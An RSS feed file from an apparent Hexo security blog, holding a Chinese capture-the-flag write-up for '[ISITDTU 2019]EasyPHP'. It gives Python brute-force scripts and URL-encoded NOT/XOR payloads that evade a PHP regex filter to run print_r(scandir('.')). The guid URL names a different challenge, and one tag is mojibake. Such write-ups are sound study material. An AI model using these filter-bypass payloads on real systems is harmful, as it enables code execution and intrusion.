@@ -1,0 +1,233 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Hexo • Posts by &#34;取反异或&#34; tag</title>
+        <link>http://odiws.github.io</link>
+        <description></description>
+        <language>en</language>
+        <pubDate>Sun, 04 Aug 2024 22:58:59 +0800</pubDate>
+        <lastBuildDate>Sun, 04 Aug 2024 22:58:59 +0800</lastBuildDate>
+        <category>buuctf</category>
+        <category>system_file</category>
+        <category>sql文件读取</category>
+        <category>文件内无字符rce</category>
+        <category>文件上传</category>
+        <category>php绕过open_basedir设置</category>
+        <category>无字母rce</category>
+        <category>ctf</category>
+        <category>php原生类利用</category>
+        <category>php反序列化</category>
+        <category>md5()和sha1()对类进行hash 触发__toString方法</category>
+        <category>http</category>
+        <category>cms框架</category>
+        <category>python</category>
+        <category>mongodb注入</category>
+        <category>条件竞争：利用session.upload_progress</category>
+        <category>preg_match绕过</category>
+        <category>$_server query_string 绕过</category>
+        <category>$_request绕过</category>
+        <category>file_get_cotents绕过</category>
+        <category>sha1函数比较数组绕过</category>
+        <category>create_function运用</category>
+        <category>buuctf， 反序列化</category>
+        <category>regexp注入</category>
+        <category>ECB加密</category>
+        <category>php7 segment fault特性</category>
+        <category>json数据爬虫</category>
+        <category>phar反序列化</category>
+        <category>js</category>
+        <category>CRLF Injection</category>
+        <category>soap</category>
+        <category>pickle反序列化</category>
+        <category>thinkphpV6.0.0</category>
+        <category>buuctf， 伪随机数</category>
+        <category>zip加密</category>
+        <category>xxe</category>
+        <category>xml_upload</category>
+        <category>flask的session伪造</category>
+        <category>二次渲染</category>
+        <category>buuctf，Perl后端文件上传</category>
+        <category>buuctf，xxe漏洞</category>
+        <category>java</category>
+        <category>flask</category>
+        <category>ctf工具安装教程</category>
+        <category>sql注入</category>
+        <category>php绕过open_opedir设置</category>
+        <category>TOTP</category>
+        <category>rce</category>
+        <category>ssti</category>
+        <category>insert截断</category>
+        <category>xss攻击</category>
+        <category>c的预处理</category>
+        <category>图片类</category>
+        <category>爬虫</category>
+        <category>js原型链污染</category>
+        <category>反序列化字符串逃逸</category>
+        <category>sql injection</category>
+        <category>文件上传(头像上传)</category>
+        <category>session反序列化</category>
+        <category>ssrf</category>
+        <category>HTTP走私攻击</category>
+        <category>json数据unicode转码绕过</category>
+        <category>对sqlite的sql注入</category>
+        <category>未理解</category>
+        <category>命令执行</category>
+        <category>zip软链接</category>
+        <category>python_seed函数</category>
+        <category>session伪造</category>
+        <category>js-vm沙箱逃逸</category>
+        <category>willphp2.2</category>
+        <category>ssti-smarty3.1.39</category>
+        <category>./htaccess文件上传</category>
+        <category>php未解析</category>
+        <category>利用环境变量构造bash命令</category>
+        <category>利用.htaccess构成后门</category>
+        <category>通过php_value来设置preg_macth正则回溯次数</category>
+        <category>java反序列化</category>
+        <category>伪随机数</category>
+        <category>mysql</category>
+        <category>信息搜集（js，网络）</category>
+        <category>异或</category>
+        <category>密码爆破</category>
+        <category>sqlmap使用</category>
+        <category>SQL注入</category>
+        <category>文件包含</category>
+        <category>php伪协议</category>
+        <category>pearcmd文件包含</category>
+        <category>xpath注入</category>
+        <category>Padding oracle attack 与CBC翻转字节攻击</category>
+        <category>php</category>
+        <category>sql盲注</category>
+        <category>php7.4</category>
+        <category>FFI预处理</category>
+        <category>thinkphp3.2.4</category>
+        <category>jwt</category>
+        <category>sql二次注入</category>
+        <category>MD5碰撞</category>
+        <category>jwt密码爆破</category>
+        <category>cms</category>
+        <category>create_function()函数</category>
+        <category>sqlע��</category>
+        <category>jwt身份验证</category>
+        <category>rc4</category>
+        <category>CRLF</category>
+        <category>任意文件读取</category>
+        <category>PDO堆叠注入</category>
+        <category>test</category>
+        <category>tag2</category>
+        <category>shell反弹</category>
+        <category>phpexit绕过</category>
+        <category>require_once函数</category>
+        <category>xss</category>
+        <category>302跳转</category>
+        <category>反序列化</category>
+        <category>F5隐写</category>
+        <category>php伪协议+文件上传</category>
+        <category>无字符rce</category>
+        <category>fastcgi-php-FPM</category>
+        <category>disable_function</category>
+        <category>nodejs</category>
+        <category>hash_hamc函数</category>
+        <category>取反异或</category>
+        <item>
+            <guid isPermalink="true">http://odiws.github.io/2024/08/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/</guid>
+            <title>[ISITDTU 2019]EasyPHP</title>
+            <link>http://odiws.github.io/2024/08/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/</link>
+            <category>buuctf</category>
+            <category>取反异或</category>
+            <pubDate>Sun, 04 Aug 2024 22:58:59 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;isitdtu-20191imagesisitdtu-2019easyphp1pngeasyphp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#isitdtu-20191imagesisitdtu-2019easyphp1pngeasyphp&#34;&gt;#&lt;/a&gt; [ISITDTU 2019]![1](…/images/[ISITDTU 2019]EasyPHP/1.png)EasyPHP&lt;/h2&gt;
+&lt;p&gt;思路很简单，绕过这两个 &lt;code&gt;if&lt;/code&gt;  即可任意代码执行&lt;/p&gt;
+&lt;p&gt;先看一下第一个正则匹配&lt;br&gt;
+看不懂的推荐使用这个网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yZWdleDEwMS5jb20v&#34;&gt;https://regex101.com/&lt;/span&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if ( preg_match(&#39;/[\x00- 0-9\&#39;&amp;quot;`$&amp;amp;.,|[&amp;#123;_defgops\x7F]+/i&#39;, $_) )
+    die(&#39;rosé will not do it&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;![2](…/images/[ISITDTU 2019]EasyPHP/2.png)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字
+&#39;&amp;quot;`$&amp;amp;.,|[&amp;#123;_defgops              匹配这些字符
+\x7F                            匹配DEL(\x7F)字符
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;匹配到以上字符就 die 掉&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if ( strlen(count_chars(strtolower($_), 0x3)) &amp;gt; 0xd )
+    die(&#39;you are so close, omg&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当 mode=3: 会返回包含所有用过的不同字符的字符串&lt;/p&gt;
+&lt;p&gt;![3](…/images/[ISITDTU 2019]EasyPHP/3.png)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$array=get_defined_functions();//返回所有内置定义函数
+foreach($array[&#39;internal&#39;] as $arr)&amp;#123;
+    if ( preg_match(&#39;/[\x00- 0-9\&#39;&amp;quot;\`$&amp;amp;.,|[&amp;#123;_defgops\x7F]+/i&#39;, $arr) ) continue;
+    if ( strlen(count_chars(strtolower($arr), 0x3)) &amp;gt; 0xd ) continue;
+    print($arr.&#39;&amp;lt;br/&amp;gt;&#39;);
+&amp;#125;
+
+//运行结果
+bcmul
+rtrim
+trim
+ltrim
+chr
+link
+unlink
+tan
+atan
+atanh
+tanh
+intval
+mail
+min
+max
+virtual
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;没有我们需要的函数&lt;br&gt;
+在观看正则规则的时候发现没有过滤 &lt;code&gt;~&lt;/code&gt;  和 &lt;code&gt;^&lt;/code&gt;  字符，想到可以取反编码绕过和异或绕过&lt;br&gt;
+具体参考我的这篇文章：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA0NjMxMTQy&#34;&gt;关于 PHP 正则的一些绕过方法&lt;/span&gt;&lt;br&gt;
+首先来个 &lt;code&gt;phpinfo()&lt;/code&gt;  看一下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PS C:\Users\Administrator&amp;gt; php -r &amp;quot;echo urlencode(~&#39;phpinfo&#39;);&amp;quot; 
+%8F%97%8F%96%91%99%90
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;![4](…/images/[ISITDTU 2019]EasyPHP/4.png)&lt;/p&gt;
+&lt;p&gt;python 代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;final_string=&amp;quot;phpinfo&amp;quot;
+allowed=&amp;quot;!#%()*+-/:;&amp;lt;=&amp;gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&amp;#125;~&amp;quot;
+for a in final_string:    
+    for i in allowed:
+        for p in allowed:
+            if ord(i)^ord(p)==ord(a):
+                print(&amp;quot;i=%s p=%s a=%s&amp;quot;%(i,p,a))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;暴力搜索符合条件的字符串，例如：phpinfo=%8f%97%8f%96%91%99%90^% ff% ff% ff% ff% ff% ff% ff。&lt;/p&gt;
+&lt;p&gt;查看 &lt;code&gt;disable_functions&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,escapeshellarg,escapeshellcmd,passthru,proc_close,proc_get_status,proc_open,shell_exec,mail,imap_open,
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;从 phpinfo 返回中可以看到所有命令执行的函数都被 disable 了。同时也限制了 open_basedir 在 /var/www/html。下一步是找 flag 文件。我们可以用 scandir () 或者 glob () 函数列目录，但它返回一个数组，我们还需要一个 print_r 或 var_dump&lt;/p&gt;
+&lt;p&gt;即目标为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print_r(scandir(&#39;.&#39;));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现可以运行，但是 count_chars 那里过不去，我们一共用了 16 个不同字符，下一步是缩减字符数。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original chars,11 total
+result = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c]  # to be deleted
+temp = []
+for d in result2:
+    for a in result:
+        for b in result:
+            for c in result:
+                if (a ^ b ^ c == d):
+                    if a == b == c == d:
+                        continue
+                    else:
+                        print(&amp;quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&amp;quot; % (a, b, c, d))
+                        if d not in temp:
+                            temp.append(d)
+print(len(temp), temp)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;除了必要的 ()^; 以外，我们最多剩余 9 个字符的空间，逐步删除 result 里的值，当结果仍能保持 11 个，就意味着我们可以继续删除了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print_r(scandir(.));=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;![5](…/images/[ISITDTU 2019]EasyPHP/5.png)&lt;/p&gt;
+&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Ny9hcnRpY2xlL2RldGFpbHMvMTA1Nzg2MTE0&#34;&gt;https://blog.csdn.net/mochu7777777/article/details/105786114&lt;/span&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
